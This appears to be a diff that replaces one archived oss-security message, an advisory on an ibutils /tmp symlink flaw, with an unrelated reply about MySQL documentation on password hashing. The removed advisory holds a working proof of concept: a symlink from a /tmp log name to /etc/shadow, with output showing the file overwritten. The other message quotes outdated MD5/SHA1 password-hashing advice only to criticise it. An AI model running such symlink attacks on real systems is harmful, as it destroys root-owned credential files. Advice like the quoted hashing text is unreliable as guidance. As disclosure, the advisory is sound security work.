@@ -1,114 +1,40 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/03/25/12
-Message-id: <f00ab32d-2f34-43b0-84c2-1f44ef84ed5d@me.com>
-Date: Mon, 25 Mar 2013 22:18:07 +0000 (GMT)
-From: "Larry W. Cashdollar" <larry0@...com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/11/07/1
+Message-ID: <527B76F1.1090801@oracle.com>
+Date: Thu, 07 Nov 2013 11:18:09 +0000
+From: John Haxby <john.haxby@...cle.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE request: ibutils improper use of files in /tmp
+Subject: Re: Source of bad password hashing practices? MySQL manual...
 Content-Type: text/plain; charset=utf-8
 
-Sorry I missed sending this to the oss-security﻿ list:
-
-OpenFabrics ibutils 1.5.7 /tmp clobbering vulnerability
-
-3/6/2013
-Larry W. Cashdollar
-@_larry0
-
-The infiniband diagnostic utiltiy handles files in /tmp insecurely. A malicious user can clobber root owned files with common symlink attacks.
-
-http://www.openfabrics.org/downloads/ibutils/
-
-[nobody@...b01 tmp]$ ln -s /etc/shadow ibdiagnet.log
-[nobody@...b01 tmp]$ ls -l ibdiagnet.log lrwxrwxrwx 1 nobody users 11 Mar 6 18:19 ibdiagnet.log -> /etc/shadow [nobody@...b01 tmp]$
-The following files are created, I imagine anyone of them can be used.
-
-[root@...b01 tmp]# ls -l /tmp/ibdiagnet*
--rw-r--r-- 1 root root  57611 Mar  6 18:20 /tmp/ibdiagnet.db
--rw-r--r-- 1 root root    830 Mar  6 18:20 /tmp/ibdiagnet.fdbs
--rw-r--r-- 1 root root   5805 Mar  6 18:20 /tmp/ibdiagnet_ibis.log
--rw-r--r-- 1 root root   2359 Mar  6 18:20 /tmp/ibdiagnet.log
--rw-r--r-- 1 root root   7072 Mar  6 18:20 /tmp/ibdiagnet.lst
--rw-r--r-- 1 root root    456 Mar  6 18:20 /tmp/ibdiagnet.mcfdbs
--rw-r--r-- 1 root root    784 Mar  6 18:20 /tmp/ibdiagnet.pkey
--rw-r--r-- 1 root root   3348 Mar  6 18:20 /tmp/ibdiagnet.psl
--rw-r--r-- 1 root root 179228 Mar  6 18:20 /tmp/ibdiagnet.slvl
--rw-r--r-- 1 root root    193 Mar  6 18:20 /tmp/ibdiagnet.sm
-
-After root runs a diagnostic command:
-
-[root@...b01 tmp]# ibdiagnet -ls 10 -lw 4x -vlr Loading IBDIAGNET from: /usr/lib64/ibdiagnet1.5.7 -W- Topology file is not specified.
-
-Reports regarding cluster links will use direct routes. Loading IBDM from: /usr/lib64/ibdm1.5.7 -W- A few ports of local device are up.
-
-Since port-num was not specified (-p option), port 1 of device 1 will be used as the local port.
--I- Discovering ... 7 nodes (2 Switches & 5 CA-s) discovered. .
-.
-.
-.
-
-Extracting SL Based Routing Info 0 0
-Please see /tmp/ibdiagnet.log for complete log
-
--I- Done. Run time was 2 seconds.
-Symlinked files are overwritten:
-
-[root@...b01 tmp] ls -l /etc/shadow
--rw------- 1 root root 2359 Mar 6 18:17 /etc/shadow [root@...b01 tmp] head /etc/shadow
--W- Topology file is not specified.
-
-Reports regarding cluster links will use direct routes. -W- A few ports of local device are up.
-
-Since port-num was not specified (-p option), port 1 of device 1 will be used as the local port.
--I- Discovering ... 7 nodes (2 Switches & 5 CA-s) discovered.
-
--I--------------------------------------------------- -I- Bad Guids/LIDs Info
-Versions installed
-
-[root@...b01 tmp] rpm -aq |grep ibutils ibutils-1.5.7-1.el5
-ibutils-libs-1.5.7-1.el5
-ibutils-devel-1.5.7-1.el5
-[root@...b01 tmp]
-ibis binary also creates files insecurely in /tmp: /tmp/ibis.log from the man page:
-
-IBIS(1)             IB MANAGEMENT IN-BAND SERVICES PACKAGE             IBIS(1)
-
-NAME
-       ibis - IB management Inband Services - an extended TCL shell
-
-SYNOPSYS
-       ibis [-port_num ]
-
-DESCRIPTION
-       ibis is a TCL shell extended with interface for sending and receiving IB management datagrams (MADS).  To use this shell you
-       will write TCL code that excersizes the regular TCL command and the special API provided by this extension. Interactive use is
-       also possible and is greatly enhanced if tclreadline package is available on the machine.
-
-       The following sub sections provide detailed definition for the API and global objects defined by the extension. The different
-       MADs APIs are group by the management class.
+On 09/10/13 00:57, Rich Felker wrote:
+> It's come to my attention recently that the MySQL reference manual is
+> recommending very poor password hashing practices as part of its
+> security guidelines:
+> 
+>   "Do not store cleartext passwords in your database. If your computer
+>   becomes compromised, the intruder can take the full list of
+>   passwords and use them. Instead, use SHA2(), SHA1(), MD5(), or some
+>   other one-way hashing function and store the hash value."
+> 
+>   (http://dev.mysql.com/doc/refman/5.7/en/security-guidelines.html)
+> 
+> With MySQL being one of the major traditional "LAMP stack" components,
+> I wonder if this is the source from which many web developers are
+> getting their ideas on how to do password hashing. What is the proper
+> procedure for publicizing documentation bugs like this which are
+> leading to poor security practice, and for getting them fixed?
 
 
+I passed on the comments from this message and its replies and they
+eventually made their way to the MySQL documentation team and I got this
+reply about a week ago:
 
-http://vapid.dhs.org/advisories/ibutils-file-clobber.html
+> 
+> Just to let you know that the MySQL documentation team have committed the change based your suggestion and it should show up soon in the MySQL Reference Manual.
 
-On Mar 25, 2013, at 02:49 PM, Vincent Danen <vdanen@...hat.com> wrote:
 
-> It was reported on full-disclosure that ibutils suffers from improper
-> use of files /tmp that could allow a user to clobber files as the user
-> running ibutils (probably usually root).
->
-> I didn't see a CVE request for this or anything show up here; if one
-> hasn't been assigned, could it be?
->
-> Thanks.
->
-> References:
->
-> http://seclists.org/fulldisclosure/2013/Mar/87
-> https://bugzilla.redhat.com/show_bug.cgi?id=927430
->
->
-> -- 
-> Vincent Danen / Red Hat Security Response Team
+jch
 
-Content of type "text/html" skipped
+(Other than having the same employer I don't have anything to do with
+MySQL so I haven't seen the changes.)
